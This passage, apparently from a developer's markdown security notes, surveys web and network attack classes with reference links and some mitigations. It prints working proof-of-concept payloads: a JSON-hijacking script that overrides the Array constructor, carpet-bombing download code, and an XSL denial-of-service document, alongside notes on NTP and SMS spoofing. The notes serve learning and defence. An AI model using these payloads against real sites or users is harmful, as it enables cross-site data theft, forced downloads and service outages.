250 <recipient@example.org> is syntactically correct
354 Enter message, ending with "." on a line by itself
250 OK id=15IYAS-00073G-00
221 mail.example.org closing connection
-->
```

- [Issue 624462 - chromium - Reduce cases where HTTP/0.9 is supported - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=624462)
- [Issue 600352 - chromium - Security: Cross-Protocol Theft from non-HTTP services via DNS rebinding + HTTP/0.9 - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=600352)
- https://bugzilla.mozilla.org/show_bug.cgi?id=1262128
- [The HTML Form Protocol Attack — Jochen Topf](https://www.jochentopf.com/hfpa/hfpa.pdf) https://www.jochentopf.com/hfpa/

### Backdoors

**It's a breach of your security system. Anyone can found and use it.**

- https://github.com/Xyl2k/TSA-Travel-Sentry-master-keys
- [Travel Sentry - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/Travel_Sentry#Master_Key_Compromise)
- [Transportation Security Administration - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/Transportation_Security_Administration#Luggage_locks)

### Time sync issue

If NTP is spoofed

> Changing time on devices is more an annoyance than anything, and doesn't necessarily get you into a device.

How about you set the time on your server ahead by 5 years:

- Most of your passwords would expire
- All your SSL certs would expire
- All your TOTPs, like Google Authenticator would fail
- All your IPSEC tunnels would drop, and refuse to restart
- Many of your cron jobs would got nuts, possibly deleting all your logs
- Much of your DNSSEC would expire
- Many of your backups would be deleted since they 'expired'

Fack: setting your iPhone to 1 Jan 1970 would brick it. Fixed in iOS 9.3

- [Why 1/1/1970 Bricks Your iPhone - YouTube](https://www.youtube.com/watch?v=MVI87HzfskQ)

- [NTP server misuse and abuse — Wikipedia](https://en.wikipedia.org/wiki/NTP_server_misuse_and_abuse)
- [network - Is NTP vulnerable to DNS poisoning or spoofing attacks? - Information Security Stack Exchange](http://security.stackexchange.com/questions/4981/is-ntp-vulnerable-to-dns-poisoning-or-spoofing-attacks)

### Cross site JSON access

GET request return JSON response as array `["foor", 2, "bar", "baz"]`, a third party document could access it, despit CS protections:

How it's works: rewrite Array constructor, which will be called by the engine when the json is parsed as JavaScript

> If the JSON starts directly with curly braces, it gets intepreted as a code block, rather than an object initializer, and nothing happens.

Require:

- JavaScript enabled / not blocked
- an old browser engine < ECMAScript 5
- the server don't send the header `X-Content-Type-Options: nosniff` or the browser don't support it
- the server don't block the client access (using the header `Origins`, access token, etc.)

`Access-Control-Allow-Origin` don't do any thing here

POC:

```html
<!-- Note: This issue has been fixed -->
<script>
var secretInfos;
var arrayOrg = Array;// redefine Array constructor
Array = function() {
	secretInfos = this;
};
</script>
<script src="http://haacked.com/demos/secret-info.json"></script>
<script>
Array = arrayOrg;// restore Array constructor
secretInfos = Array.prototype.slice.call(secretInfos);
console.log(secretInfos);
</script>
```

- [Redefining the Array constructor in javascript - Stack Overflow](https://stackoverflow.com/questions/15385588/redefining-the-array-constructor-in-javascript)
- [Jeremiah Grossman: Advanced Web Attack Techniques using GMail](http://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html)
- [Anatomy of a Subtle JSON Vulnerability - You’ve Been Haacked](http://haacked.com/archive/2008/11/20/anatomy-of-a-subtle-json-vulnerability.aspx/)
- [JSON is not as safe as people think it is - Incompleteness](http://incompleteness.me/blog/2007/03/05/json-is-not-as-safe-as-people-think-it-is/)
- [robubu : Safe JSON](http://robubu.com/?p=24)
- [hackademix.net » You Don't Know What My Twitter Leaks](https://hackademix.net/2009/01/13/you-dont-know-what-my-twitter-leaks/)
- [JSON Hijacking - You’ve Been Haacked](http://haacked.com/archive/2009/06/25/json-hijacking.aspx/)

### Carpet-bombing

Can be done with iframes

```html
<iframe src="filetodownload1.exe"></iframe>
<iframe src="filetodownload2.exe"></iframe>
<iframe src="filetodownload3.exe"></iframe>
```

or with JS

```js
var dl_link = document.createElement('a');
document.body.appendChild(dl_link);
dl_link.setAttribute('href', "data:,Hello%2C%20World!");
for(let i = 1; i <= 5; i++){
	dl_link.setAttribute('download', 'test_'+i+'.txt');
	dl_link.dispatchEvent(new MouseEvent("click"));// dl_link.click()
}
```

- [Google Chrome vulnerable to carpet-bombing flaw | ZDNet](http://www.zdnet.com/article/google-chrome-vulnerable-to-carpet-bombing-flaw/)
- [127522 - Security: Chrome Allows "Carpet Bomb" from File Download - chromium - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=127522)
- [Carpet bombing — Wikipedia](https://en.wikipedia.org/wiki/Carpet_bombing)
- [Chrome Free Coupwns](http://raffon.net/research/google/chrome/carpet.html)
- [Microsoft Security Advisory 953818](https://technet.microsoft.com/en-us//library/security/953818)

### Multipart replace resource

- [Page Loading: multipart test 1: Kitchen](https://hixie.ch/tests/evil/page-loading/multipart/001.cgi)

### SQL injection

- [Rails SQL Injection Examples](http://rails-sqli.org/)

### Wordpress

On common attack use upload mecanism (provided by thridpart plugins) to execute PHP scripts

`/upload/.htaccess`:

```apache
<Files *.php>
Deny from all
</Files>
```

Or DDoS by using pingbacks or xmlrpc. Disable it or whitelisted IPs in `.htaccess`

- [Attacking WordPress | HackerTarget.com](https://hackertarget.com/attacking-wordpress/)

### HTML/SVG/XML vulnerabilities

The same for HTML files. See also `innerHTML`

All browsers/libs don't handle the same way this files

- [XSS and injection vulnerabilities](#xss-and-injection-vulnerabilities)
- [XXE](https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing)
- [Billion laughs](https://www.owasp.org/index.php/XML_Security_Cheat_Sheet#Billion_Laughs)
- [quadratic blowup](https://www.owasp.org/index.php/XML_Security_Cheat_Sheet#Quadratic_Blowup)
- XSL DoS attack
    ```xml
	<?xml version="1.0"?>
	<?xml-stylesheet type="text/xsl" href="#stylesheet"?>
	<!DOCTYPE responses [
		<!ATTLIST xsl:stylesheet id ID #REQUIRED>
	]>
	<root>
		<node/>
		<node/>
		<node/>
		<node/>
		<node/>
		<node/>
		<node/>
		<node/>
		<node/>
		<node/>
		<node/>
		<xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
			<xsl:template match="/">
				<xsl:for-each select="/root/node">
					<xsl:for-each select="/root/node">
						<xsl:for-each select="/root/node">
							<xsl:for-each select="/root/node">
								<xsl:for-each select="/root/node">
									<xsl:for-each select="/root/node">
										<xsl:for-each select="/root/node">
											<xsl:for-each select="/root/node">
												<xsl:for-each select="/root/node">
													<xsl:for-each select="/root/node">
														<pwnage/>
													</xsl:for-each>
												</xsl:for-each>
											</xsl:for-each>
										</xsl:for-each>
									</xsl:for-each>
								</xsl:for-each>
							</xsl:for-each>
						</xsl:for-each>
					</xsl:for-each>
				</xsl:for-each>
			</xsl:template>
		</xsl:stylesheet>
	</root>
    ```
	
	- [Security: A harmless SVG + XSLT curiousity](http://scarybeastsecurity.blogspot.fr/2011/01/harmless-svg-xslt-curiousity.html)
- etc.

Some attacks can be blocked by [Content Security Policy](#content-security-policy)

- [Deserialization of untrusted data - OWASP](https://www.owasp.org/index.php/Deserialization_of_untrusted_data)
- [XML Security Cheat Sheet - OWASP](https://www.owasp.org/index.php/XML_Security_Cheat_Sheet#Quadratic_Blowup)
- [The innerHTML Apocalypse](http://www.slideshare.net/x00mario/the-innerhtml-apocalypse)
- https://hackinparis.com/data/slides/2011/09-TheForbiddenImage.pdf
- [HTML Purifier - Filter your HTML the standards-compliant way!](http://htmlpurifier.org/)
- https://github.com/cure53/DOMPurify
- https://github.com/notriddle/ammonia
- https://github.com/darylldoyle/svg-sanitizer
- [#24251 (Reconsider SVG inclusion to get_allowed_mime_types) – WordPress Trac](https://core.trac.wordpress.org/ticket/24251#comment:27)
- [web application - What does a HTML filter need to do, to protect against SVG attacks? - Information Security Stack Exchange](http://security.stackexchange.com/questions/26264/what-does-a-html-filter-need-to-do-to-protect-against-svg-attacks/30390#30390)

### XSS and injection vulnerabilities

See [XSS and injection prevention](#xss-and-injection-prevention)

- [XSS game](https://xss-game.appspot.com/) - [Google created an XSS game to teach you how to exploit and prevent them (x-post from /r/php) : webdev](https://www.reddit.com/r/webdev/comments/5s1ex0/google_created_an_xss_game_to_teach_you_how_to/)
- [HTTP/0.9 vulnerability](#http09-vulnerability)
- [HTML5 Security Cheatsheet - A collection of HTML5 related XSS attack vectors](https://github.com/cure53/H5SC)
- [EXIF Cross Site Scripting, PHP Fun – Confessions Of A Dangerous Mind](http://www.sectorix.com/2013/12/02/exif-cross-site-scripting-php-fun/)
- [Malware Hidden Inside JPG EXIF Headers](https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html)
- Some data can bypass CSP [Polyglot JPEG - JS file](#polyglot-jpeg---js-file)
- [The Shortest Reflected XSS Attack Possible - Fooling the Interpreter](http://brutelogic.com.br/blog/shortest-reflected-xss-possible/)
- [Widespread XSS Vulnerabilities in Ad Network Code Affecting Top Tier Publishers, Retailers - Randy Westergren](https://randywestergren.com/widespread-xss-vulnerabilities-ad-network-code-affecting-top-tier-publishers-retailers/)
- [PortSwigger Web Security Blog: Exploiting CORS Misconfigurations for Bitcoins and Bounties](http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html)
- [Cross-Site Request Forgery (CSRF) - OWASP](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)
- [XSS Archive | XSSed.com](http://www.xssed.com/archive/)
- [Zoom Zero Day: 4+ Million Webcams & maybe an RCE? Just get them to visit your website!](https://medium.com/bugbountywriteup/zoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5)

### SMS spoofing

By defining sender ID (sender name, OAdC - Originating Address Code) with a business name or phone number

Doesn't work for Canada, China, Taiwan and the USA. China, Mexico, South Africa, Belgium?

> A maximum of 11 characters or 12 digits, we recommend you only use letters and numbers as some handsets don’t correctly handle punctuation. If not specified, your account default will be used. If you’re sending with a text from address and your message isn’t delivered try again but change to sending from a telephone number - some international networks place restrictions on the from addresses they’ll accept. Due to US telecomunications rules you’re unable to set the from address when sending to the USA - the text will always come from 43704.
— [Send SMS using XML - Clockwork SMS API](https://www.clockworksms.com/doc/clever-stuff/xml-interface/send-sms/#from)

- [SMS spoofing — Wikipedia](https://en.wikipedia.org/wiki/SMS_spoofing)
- [telephony - How do some SMS messages transmit the senders name? - Stack Overflow](https://stackoverflow.com/questions/11605323/how-do-some-sms-messages-transmit-the-senders-name)
- [How to send someone SMS (text) from mobile and he/she receives a name instead of a number even though he/she does not have my mobile number in his/her contact - Quora](https://www.quora.com/How-do-I-send-someone-SMS-text-from-mobile-and-he-she-receives-a-name-instead-of-a-number-even-though-he-she-does-not-have-my-mobile-number-in-his-her-contact)
- [SMS Spoofing with Python for Good and Evil – The Durk Web](http://www.thedurkweb.com/sms-spoofing-with-python-for-good-and-evil/) - [SMS Spoofing with Python for Good and Evil : Python](https://www.reddit.com/r/Python/comments/6dtp3d/sms_spoofing_with_python_for_good_and_evil/)
- [How do I show my mobile number when sending SMS text messages from Skype?](https://support.skype.com/en/faq/FA672/how-do-i-show-my-mobile-number-when-sending-sms-text-messages-from-skype)
- [Loi n° 2004-575 du 21 juin 2004 pour la confiance dans l'économie numérique | Legifrance](https://www.legifrance.gouv.fr/affichTexte.do?cidTexte=JORFTEXT000000801164&dateTexte=)
- [Loi n° 78-17 du 6 janvier 1978 relative à l'informatique, aux fichiers et aux libertés | Legifrance](https://www.legifrance.gouv.fr/affichTexte.do?cidTexte=LEGITEXT000006068624&dateTexte=20090813)
- [Country Specific Features and Restrictions – Knowledgebase](https://help.nexmo.com/hc/en-us/sections/200622473-Country-Specific-Features-and-Restrictions)
- [A guide to succesful international SMS messages: international rules and guideli](https://www.cmtelecom.com/newsroom/sending-international-sms-country-specific-rules-regulations-and-habits)
